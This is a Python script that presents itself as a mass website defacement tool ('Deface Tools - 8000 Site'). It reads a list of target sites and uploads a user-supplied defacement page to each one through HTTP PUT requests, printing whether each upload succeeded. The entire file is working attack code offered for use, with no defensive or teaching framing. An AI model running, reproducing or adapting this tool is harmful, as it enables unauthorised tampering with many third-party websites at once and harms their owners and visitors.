#-*- coding: utf-8 -*-
try:
   import requests
   import os.path
   import sys
   from colorama import Fore
except ImportError:
   exit("install requests and try again ...")
   
os.system("clear")
banner = """
================================================================
||   __  __       _                                ______     ||
||  |  \/  |     (_)        /\                    |____  |    ||
||  | \  / | ___  _  ___   /  \   _ __   ___  _ __    / /     ||
||  | |\/| |/ _ \| |/ _ \ / /\ \ | '_ \ / _ \| '_ \  / /      ||
||  | |  | | (_) | | (_) / ____ \| | | | (_) | | | |/ /       ||
||  |_|  |_|\___/| |\___/_/    \_\_| |_|\___/|_| |_/_/        || 
||              _/ |                                          || 
||            |__/                                            ||
||                                                            ||
||                                                            ||
||  MojoAnon7 - Deface Tools - 8000 Site                      || 
================================================================


\033[32mTool Author  : MojoAnon7\033[0m
\033[33mGithub       : https://github.com/Anonymousnism\033[0m
\033[33mTelegram     : https://t.me/YourAnonNewsPost\033[0m\n
\033[33mTwittee     : https://twitter.com/anonymousnws12\033[0m\n


================================================================

"""
b = '\033[31m'
h = '\033[32m'
m = '\033[00m'
def eagle(tetew):
   ipt = ''
   if sys.version_info.major > 2:
      ipt = input(tetew)
   else:
      ipt = raw_input(tetew)
   
   return str(ipt)

def white(script,target_file="target.txt"):
   op = open(script,"r").read()
   with open(target_file, "r") as target:
      target = target.readlines()
      s = requests.Session()
      print("uploading  your script to %d website"%(len(target)))
      for web in target:
         try:
            site = web.strip()
            if site.startswith("http://") is False:
               site = "http://" + site
            req = s.put(site+"/"+script,data=op)
            if req.status_code < 200 or req.status_code >= 250:
               print(m+"["+b+" FAILED TO UPLOAD !"+m+" ] %s/%s"%(site,script))
            else:
               print(m+"["+h+" SUCCESSFULLY UPLOADED"+m+" ] %s/%s"%(site,script))

         except requests.exceptions.RequestException:
            continue
         except KeyboardInterrupt:
            print; exit()

def main(__bn__):
   print(__bn__)
   while True:
      try:
         print('Please put the deface script in this same folder [white-deface] ')
         print(' ')
         a = eagle("[+]Enter your deface script's name or it's path [eg: defacescript.html] : ")
         if not os.path.isfile(a):
            print("file '%s' not found"%(a))
            continue
         else:
            break
      except KeyboardInterrupt:
         print; exit()

   white(a)

if __name__ == "__main__":
    main(banner)

